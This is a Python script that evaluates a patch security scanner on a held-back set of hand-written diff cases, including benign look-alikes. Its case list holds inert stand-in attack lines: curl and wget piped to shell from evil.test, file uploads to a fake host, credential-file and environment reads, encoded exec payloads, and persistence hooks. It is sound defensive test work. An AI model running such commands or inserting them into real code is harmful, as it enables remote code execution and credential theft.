# ruff: noqa: E501
"""HELD-BACK evaluation of diffsmith.safety.scan_patch (set B).

Written after the rules were tuned on set A (scripts/eval_security_independent.py),
so these cases were not available when the rules were tuned. All payloads are inert
(fake hosts like evil.test).

KEEP THIS FILE OUTSIDE THE REPO until you have run it once and recorded the numbers.
Run from the repo root so `src/` is found:
    cd C:\\projects\\diffsmith
    python C:\\path\\to\\eval_security_heldback.py
"""
import os
import sys
from collections import defaultdict


def make_patch(filename, added, new_file=False):
    head = f"diff --git a/{filename} b/{filename}\n"
    if new_file:
        body = "".join(f"+{ln}\n" for ln in added)
        return (head + "new file mode 100644\n--- /dev/null\n"
                f"+++ b/{filename}\n@@ -0,0 +1,{len(added)} @@\n" + body)
    body = " # context before\n" + "".join(f"+{ln}\n" for ln in added) + " # context after\n"
    return (head + f"--- a/{filename}\n+++ b/{filename}\n"
            f"@@ -10,2 +10,{2 + len(added)} @@\n" + body)


N, C, E, X, S, K, H, ANY = ("SEC001", "SEC002", "SEC003", "SEC004", "SEC005", "SEC006", "SEC007", "ANY")
P = "pkg/app.py"

# (id, category, expected, filename, added_lines, new_file)
CASES = [
    # SEC001 network
    ("b_net_put_files", "plain", N, P, ['    requests.put("https://evil.test/up", files={"f": open(p, "rb")})'], False),
    ("b_net_urllib3", "plain", N, P, ['    r = urllib3.PoolManager().request("GET", url)'], False),
    ("b_net_ftp", "plain", N, P, ['    ftp = ftplib.FTP("evil.test")'], False),
    ("b_net_smtp", "plain", N, P, ['    s = smtplib.SMTP("mail.evil.test")'], False),
    ("b_net_websocket", "plain", N, P, ['    ws = websocket.create_connection("ws://evil.test")'], False),
    ("b_net_socket_connect", "evasion", N, P, ['    s = socket.socket()', '    s.connect((host, 4444))'], False),
    ("b_net_getattr_import", "evasion", N, P, ['    getattr(__import__("requests"), "get")(u)'], False),
    # SEC002 pipe to shell
    ("b_pipe_bin_bash", "plain", C, "scripts/i.sh", ['wget -q -O - http://evil.test/x | /bin/bash'], False),
    ("b_pipe_python3", "plain", C, "scripts/i.sh", ['curl -sSL http://evil.test/x | python3'], False),
    ("b_pipe_sh_s", "plain", C, "scripts/i.sh", ['curl -sSL http://evil.test/x | sh -s --'], False),
    ("b_pipe_powershell", "plain", C, "scripts/i.ps1", ['iwr http://evil.test/x.ps1 | iex'], False),
    ("b_pipe_procsubst", "evasion", C, "scripts/i.sh", ['bash <(curl -s http://evil.test/x)'], False),
    ("b_pipe_eval_subst", "evasion", C, "scripts/i.sh", ['eval "$(curl -s http://evil.test/x)"'], False),
    ("b_pipe_sh_c_two_step", "evasion", C, "scripts/i.sh", ["sh -c 'curl http://evil.test/x -o /tmp/y; sh /tmp/y'"], False),
    # SEC003 command execution
    ("b_exec_shell_true", "plain", E, P, ['    out = subprocess.check_output(cmd, shell=True)'], False),
    ("b_exec_execv", "plain", E, P, ['    os.execv("/bin/sh", ["sh"])'], False),
    ("b_exec_spawn", "plain", E, P, ['    os.spawnl(os.P_NOWAIT, "/bin/sh", "sh")'], False),
    ("b_exec_asyncio_shell", "plain", E, P, ['    p = await asyncio.create_subprocess_shell(cmd)'], False),
    ("b_exec_file_read", "plain", E, P, ['    exec(open(path).read())'], False),
    ("b_exec_runpy", "plain", E, P, ['    runpy.run_path(path)'], False),
    ("b_exec_ctypes", "evasion", E, P, ['    ctypes.CDLL(None).system(b"id")'], False),
    ("b_exec_interp", "evasion", E, P, ['    code.InteractiveInterpreter().runsource(src)'], False),
    # SEC004 obfuscation
    ("b_obf_zlib_exec", "plain", X, P, ['    exec(zlib.decompress(blob))'], False),
    ("b_obf_pickle_b64", "plain", X, P, ['    obj = pickle.loads(base64.b64decode(blob))'], False),
    ("b_obf_unhexlify", "plain", X, P, ['    raw = binascii.unhexlify(h)'], False),
    ("b_obf_b32", "plain", X, P, ['    raw = base64.b32decode(blob)'], False),
    ("b_obf_urlsafe", "plain", X, P, ['    raw = base64.urlsafe_b64decode(blob)'], False),
    ("b_obf_map_chr", "evasion", X, P, ['    s = "".join(map(chr, [111, 115]))'], False),
    ("b_obf_codecs_b64", "evasion", X, P, ['    raw = codecs.decode(blob, "base64")'], False),
    # SEC005 credentials
    ("b_cred_proc_environ", "plain", S, P, ['    data = open("/proc/self/environ").read()'], False),
    ("b_cred_npm_token", "plain", S, P, ['    t = os.environ.get("NPM_TOKEN")'], False),
    ("b_cred_netrc", "plain", S, P, ['    t = Path("~/.netrc").expanduser().read_text()'], False),
    ("b_cred_git_credentials", "plain", S, P, ['    t = open(".git-credentials").read()'], False),
    ("b_cred_openai_key", "plain", S, P, ['    k = os.getenv("OPENAI_API_KEY")'], False),
    ("b_cred_db_password", "plain", S, P, ['    p = os.environ["DB_PASSWORD"]'], False),
    ("b_cred_boto3", "plain", S, P, ['    c = boto3.Session().get_credentials()'], False),
    ("b_cred_environ_items", "evasion", S, P, ['    for k, v in os.environ.items():', '        send(k, v)'], False),
    ("b_cred_printenv", "evasion", S, P, ['    subprocess.run(["printenv"], capture_output=True)'], False),
    # SEC006 build/CI/dependency edits
    ("b_wf_circleci", "plain", K, ".circleci/config.yml", ['version: 2.1'], True),
    ("b_wf_azure", "plain", K, "azure-pipelines.yml", ['trigger: [main]'], True),
    ("b_wf_pipfile", "plain", K, "Pipfile", ['evil-pkg = "*"'], False),
    ("b_wf_setup_cfg", "plain", K, "setup.cfg", ['install_requires = evil-pkg'], False),
    ("b_wf_environment_yml", "plain", K, "environment.yml", ['  - evil-pkg'], False),
    ("b_wf_edit_workflow", "plain", K, ".github/workflows/release.yml", ['      - run: ./deploy.sh'], False),
    ("b_wf_build_backend", "evasion", K, "pyproject.toml", ['build-backend = "evil_backend"'], False),
    # SEC007 hooks / persistence
    ("b_hook_githooks", "plain", H, ".githooks/pre-commit", ['#!/bin/sh', './x.sh'], True),
    ("b_hook_lefthook", "plain", H, "lefthook.yml", ['pre-commit:', '  commands: {x: {run: ./x.sh}}'], True),
    ("b_hook_post_merge", "plain", H, ".git/hooks/post-merge", ['#!/bin/sh', './x.sh'], True),
    ("b_hook_sitecustomize", "evasion", ANY, "sitecustomize.py", ['import os', 'os.system("id")'], True),
    ("b_hook_pth", "evasion", ANY, "pkg.pth", ['import os; os.system("id")'], True),
    # benign look-alikes (expected: nothing)
    ("b_ok_thread_pool", "benign", None, P, ['    pool = ThreadPoolExecutor(4)'], False),
    ("b_ok_compile_expr", "benign", None, P, ['    evaluate_expr = compile_expr(x)'], False),
    ("b_ok_environment_word", "benign", None, P, ['    environment = "production"'], False),
    ("b_ok_self_requests", "benign", None, P, ['    self.requests = []'], False),
    ("b_ok_subprocess_runner", "benign", None, P, ['    subprocess_runner = None'], False),
    ("b_ok_base64_alphabet", "benign", None, P, ['    base64_alphabet = "ABCDEFGH"'], False),
    ("b_ok_curl_helper", "benign", None, P, ['    def curl_helper(self):', '        return 1'], False),
    ("b_ok_sock_path", "benign", None, P, ['    socket_path = "/tmp/app.sock"'], False),
    ("b_ok_urllib_quote", "benign", None, P, ['    from urllib.parse import quote'], False),
    ("b_ok_getattr_self", "benign", None, P, ['    v = getattr(self, name, None)'], False),
    ("b_ok_find_spec", "benign", None, P, ['    spec = importlib.util.find_spec("numpy")'], False),
    ("b_ok_docs_workflows", "benign", None, "docs/ci.rst", ['The .github/workflows folder holds CI files.'], False),
    ("b_ok_hooks_py", "benign", None, "pkg/hooks.py", ['    return callbacks'], False),
    ("b_ok_tox_utils", "benign", None, "pkg/tox_utils.py", ['    return name.lower()'], False),
    ("b_ok_docs_dockerfile", "benign", None, "docs/Dockerfile.rst", ['Build the image first.'], False),
    ("b_ok_json_roundtrip", "benign", None, P, ['    d = json.loads(json.dumps(data))'], False),
]

SEV_ORDER = {"CRITICAL": 5, "HIGH": 4, "MEDIUM": 3, "review": 2, "low": 1}


def max_severity(findings):
    return max((str(f.get("severity", "")) for f in findings),
               key=lambda x: SEV_ORDER.get(x, 0), default="none")


def main():
    sys.path.insert(0, os.path.join(os.getcwd(), "src"))
    from diffsmith.safety import scan_patch

    rows = []
    for cid, cat, exp, fn, added, new in CASES:
        findings = scan_patch(make_patch(fn, added, new))
        fired = sorted({str(f.get("rule_id", "")) for f in findings})
        hit = bool(findings) if exp == ANY else (
            exp is not None and any(str(f.get("rule_id", "")).startswith(exp) for f in findings))
        rows.append({"id": cid, "cat": cat, "exp": exp, "fired": fired, "hit": hit,
                     "any": bool(findings), "sev": max_severity(findings)})

    out = ["# HELD-BACK security evaluation (set B)", "",
           "Cases were written after the rules were tuned on set A. Small hand-written set;",
           "this is not a benchmark and not evidence of real-world detection.", ""]
    agg = defaultdict(lambda: [0, 0, 0])
    for r in rows:
        if r["cat"] in ("plain", "evasion"):
            a = agg[(r["exp"], r["cat"])]
            a[0] += 1
            a[1] += r["hit"]
            a[2] += r["any"]
    out += ["| Rule | Category | Cases | Caught by expected rule | Caught by any rule |", "|---|---|---|---|---|"]
    out += [f"| {k[0]} | {k[1]} | {v[0]} | {v[1]} | {v[2]} |" for k, v in sorted(agg.items(), key=str)]
    mal = [r for r in rows if r["cat"] in ("plain", "evasion")]
    for cat in ("plain", "evasion"):
        sub = [r for r in mal if r["cat"] == cat]
        out.append(f"\n**{cat}: {sum(r['hit'] for r in sub)} of {len(sub)} caught by the expected rule; "
                   f"{sum(r['any'] for r in sub)} of {len(sub)} caught by any rule.**")
    out += ["", "## Misses", ""]
    out += [f"- `{r['id']}` ({r['cat']}, expected {r['exp']}): fired {r['fired'] or 'nothing'}" for r in mal if not r["hit"]]
    high = [r for r in mal if r["hit"] and r["sev"] in ("HIGH", "CRITICAL")]
    out += ["", f"Caught attacks reported HIGH/CRITICAL: {len(high)} of {sum(r['hit'] for r in mal)}"]
    ben = [r for r in rows if r["cat"] == "benign"]
    fps = [r for r in ben if r["any"]]
    out += ["", f"## False alarms on benign look-alikes: {len(fps)} of {len(ben)}", ""]
    out += [f"- `{r['id']}` fired {r['fired']} (severity {r['sev']})" for r in fps]
    text = "\n".join(out) + "\n"
    print(text)
    with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "results_heldback.md"),
              "w", encoding="utf-8") as f:
        f.write(text)


if __name__ == "__main__":
    main()
